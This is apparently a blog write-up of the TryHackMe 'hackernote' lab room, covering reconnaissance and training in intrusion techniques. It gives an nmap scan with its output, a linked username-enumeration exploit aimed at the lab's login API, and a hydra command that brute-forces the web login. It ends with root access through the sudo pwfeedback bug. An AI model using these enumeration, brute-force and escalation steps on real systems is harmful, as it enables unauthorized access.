+++
title = "TryHackMe Hackernote Write-Up"
date = "2020-02-28"
author = "Mark Ramige"
authorTwitter = "markramige" #do not include @
cover = ""
tags = ["nmap", "appsec", "python", "ssh", "brute-forcing", "enumeration"]
keywords = ["nmap", "appsec", "python", "ssh", "brute-forcing", "enumeration"]
description = "[This TryHackMe challenge](https://tryhackme.com/room/hackernote) gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute forcing, and privilege escalation. It requires some basic linux skills to get started."
showFullContent = false
+++

[This TryHackMe challenge](https://tryhackme.com/room/hackernote) gives you an IP address to attack and takes you through each step of the process until you get root on the box. It covers recon, investigation, exploitation, user enumeration, password brute-forcing, and privilege escalation. It requires some basic linux skills to get started.

## Contents
* [Task 1 - Reconnaissance](#task-1-reconnaissance)
* [Task 2 - Investigate](#task-2-investigate)
* [Task 3 - Exploit](#task-3-exploit)
* [Task 4 - Attack Passwords](#task-4-attack-passwords)
* [Task 5 - Escalate](#task-5-escalate)

## Task 1 - Reconnaissance
* Which ports are open? (in numerical order)

We can run `man nmap` to check for the options we need to scan for ports and service identification (next question).

`nmap -A -T4 MACHINE_IP` seems to be what we're looking for. The output is:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-02-28 17:17 EST
Nmap scan report for MACHINE_IP
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home - hackerNote
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 24.41 seconds
```

* What programming language is the backend written in?

Notice the service listed on port 80.

## Task 2 - Investigate
Follow the instructions to set up your user account and test the web app. I'm proxying the traffic through Burp Suite.

## Task 3 - Exploit
Download the [exploit](https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/exploit.py) and [list of user names](https://raw.githubusercontent.com/NinjaJc01/hackerNoteExploits/master/names.txt)

Change the value of the URL variable in the exploit script to `"http://MACHINE_IP/api/user/login"`

Add your user name to the top of the names.txt file to increase the accuracy of the exploit.

Run `python3 exploit.py` and answer the two questions based on the output:

* How many usernames from the list are valid?

* What are/is the valid username(s)?

## Task 4 - Attack Passwords
Download the wordlists.zip file. We're running Kali Linux and the hashcat-utils package is installed so we can just run:

`/usr/bin/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist.txt`

Next we run hydra to bruteforce our passwords: (replace `USERNAME` and `MACHINE_IP`)

`hydra -l USERNAME -P wordlist.txt MACHINE_IP http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"`

* How many passwords were in your wordlist?

`wc -l wordlist.txt`

* What was the user's password?

Taken from the output of `hydra`

* What is the user's SSH password?

Log in to the web app and the password is shown

* What's the user flag?

`ssh USERNAME@MACHINE_IP`

`cat user.txt`

## Task 5 - Escalate

* What is the CVE number for the exploit?

Google `pwdfeedback` and we [find a page](https://www.sudo.ws/alerts/pwfeedback.html) that explains the vulnerability and gives us the CVE number.

* What is the root flag?

Follow the instructions on the page to download the exploit, compile it, scp to the server, and run it.

Run `cat /root/root.txt` to get the flag.
